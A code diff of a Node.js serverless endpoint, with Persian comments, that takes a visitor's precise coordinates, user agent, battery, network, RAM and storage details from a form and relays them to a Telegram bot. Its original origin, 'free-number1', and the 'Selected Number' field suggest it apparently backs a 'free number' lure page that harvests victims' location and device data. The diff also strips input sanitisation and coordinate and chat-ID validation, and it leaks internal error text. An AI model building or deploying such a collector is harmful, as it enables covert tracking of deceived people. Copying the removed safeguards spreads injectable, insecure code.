@@ -1,10 +1,14 @@
 const fetch = require('node-fetch');
-const FormData = require('formidable');
+const FormData = require('form-data');
+const formidable = require('formidable');
+
+const rateLimitMap = new Map(); // حافظه موقت برای محدود کردن درخواست‌ها
 
 module.exports = async (req, res) => {
   const botToken = process.env.TOKEN;
-  const allowedOrigin = 'https://free-number1.vercel.app'; // <- دامنه‌ی خودت
+  const allowedOrigin = 'https://yourdomain.com'; // ← دامنه‌ی مجاز
 
+  // بررسی Origin
   if (req.headers.origin && req.headers.origin !== allowedOrigin) {
     return res.status(403).json({ ok: false, error: 'Invalid origin' });
   }
@@ -13,26 +17,29 @@ module.exports = async (req, res) => {
     return res.status(405).json({ ok: false, error: 'Method not allowed' });
   }
 
-  const form = new FormData.IncomingForm();
+  // 🔒 محدود کردن هر IP به 10 درخواست در هر 15 دقیقه
+  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+  const currentTime = Date.now();
+  const windowTime = 15 * 60 * 1000; // ۱۵ دقیقه
 
-  const sanitizeInput = (input) => {
-    if (!input) return 'Unknown';
-    const sanitized = String(input)
-      .replace(/[<>]/g, '')
-      .replace(/[*_[]()#`]/g, '') 
-      .replace(/(\r\n|\n|\r|\t)/g, '') 
-      .replace(/[^\x20-\x7E]/g, ''); 
-    return sanitized.length > 500 ? sanitized.substring(0, 500) : sanitized;
-  };
+  if (!rateLimitMap.has(ip)) {
+    rateLimitMap.set(ip, []);
+  }
 
-  const isValidNumber = (value, min, max) => {
-    const num = parseFloat(value);
-    return !isNaN(num) && num >= min && num <= max;
-  };
+  const timestamps = rateLimitMap.get(ip);
+  const recentRequests = timestamps.filter(ts => currentTime - ts < windowTime);
+  recentRequests.push(currentTime);
+  rateLimitMap.set(ip, recentRequests);
+
+  if (recentRequests.length > 10) {
+    return res.status(429).json({ ok: false, error: 'Too many requests from this IP. Please wait 15 minutes.' });
+  }
+
+  const form = new formidable.IncomingForm();
 
   form.parse(req, async (err, fields, files) => {
     if (err) {
-      return res.status(500).json({ ok: false, error: 'Internal server error' });
+      return res.status(500).json({ ok: false, error: 'Failed to parse form data.' });
     }
 
     const allowedFields = [
@@ -43,7 +50,7 @@ module.exports = async (req, res) => {
 
     for (const field in fields) {
       if (!allowedFields.includes(field)) {
-        return res.status(400).json({ ok: false, error: 'Invalid input field' });
+        return res.status(400).json({ ok: false, error: 'Invalid input field: ' + field });
       }
     }
 
@@ -51,40 +58,20 @@ module.exports = async (req, res) => {
       chat_id: chatId,
       latitude,
       longitude,
-      user_agent: rawUserAgent,
-      timezone: rawTimezone,
-      battery_level: rawBatteryLevel,
+      user_agent: userAgent,
+      timezone,
+      battery_level: batteryLevel,
       battery_charging: batteryCharging,
-      network_type: rawNetworkType,
-      network_speed: rawNetworkSpeed,
-      ram: rawRam,
-      storage: rawStorage,
-      country_code: rawCountryCode
+      network_type: networkType,
+      network_speed: networkSpeed,
+      ram,
+      storage,
+      country_code: countryCode
     } = fields;
 
     if (!chatId || !latitude || !longitude) {
-      return res.status(400).json({ ok: false, error: 'Missing required parameters' });
+      return res.status(400).json({ ok: false, error: 'Missing required parameters.' });
     }
-
-    if (isNaN(chatId)) {
-      return res.status(400).json({ ok: false, error: 'Invalid chat_id' });
-    }
-
-    if (!isValidNumber(latitude, -90, 90) || !isValidNumber(longitude, -180, 180)) {
-      return res.status(400).json({ ok: false, error: 'Invalid latitude or longitude' });
-    }
-
-    const batteryLevel = rawBatteryLevel && isValidNumber(rawBatteryLevel, 0, 100) ? rawBatteryLevel : 'Unknown';
-
-    const userAgent = sanitizeInput(rawUserAgent);
-    const timezone = sanitizeInput(rawTimezone);
-    const networkType = sanitizeInput(rawNetworkType);
-    const networkSpeed = sanitizeInput(rawNetworkSpeed);
-    const ram = sanitizeInput(rawRam);
-    const storage = sanitizeInput(rawStorage);
-    const countryCode = sanitizeInput(rawCountryCode);
-
-    const isCharging = batteryCharging === 'true' ? 'Charging' : 'Not Charging';
 
     try {
       const now = new Date();
@@ -97,7 +84,7 @@ module.exports = async (req, res) => {
         `*📱 User Agent:* ${userAgent || 'Unknown'}\n` +
         `*📅 Date:* ${dateTime}\n` +
         `*🌍 Timezone:* ${timezone || 'Unknown'}\n` +
-        `*🔋 Battery:* ${batteryLevel}% (${isCharging})\n` +
+        `*🔋 Battery:* ${batteryLevel || 'Unknown'}% (${batteryCharging === 'true' ? 'Charging' : 'Not Charging'})\n` +
         `*📶 Network:* ${networkType || 'Unknown'} (${networkSpeed || 'Unknown'} Mbps)\n` +
         `*📞 Selected Number:* User Denied\n` +
         `*🌐 Country Code:* ${countryCode || 'Unknown'}\n` +
@@ -113,7 +100,7 @@ module.exports = async (req, res) => {
 
       const locResult = await locationRes.json();
       if (!locResult.ok) {
-        return res.status(500).json({ ok: false, error: 'Internal server error' });
+        return res.status(500).json({ ok: false, error: locResult.description });
       }
 
       const messageRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -124,12 +111,12 @@ module.exports = async (req, res) => {
 
       const msgResult = await messageRes.json();
       if (!msgResult.ok) {
-        return res.status(500).json({ ok: false, error: 'Internal server error' });
+        return res.status(500).json({ ok: false, error: msgResult.description });
       }
 
       return res.status(200).json({ ok: true });
     } catch (error) {
-      return res.status(500).json({ ok: false, error: 'Internal server error' });
+      return res.status(500).json({ ok: false, error: 'Failed to send data: ' + error.message });
     }
   });
 };
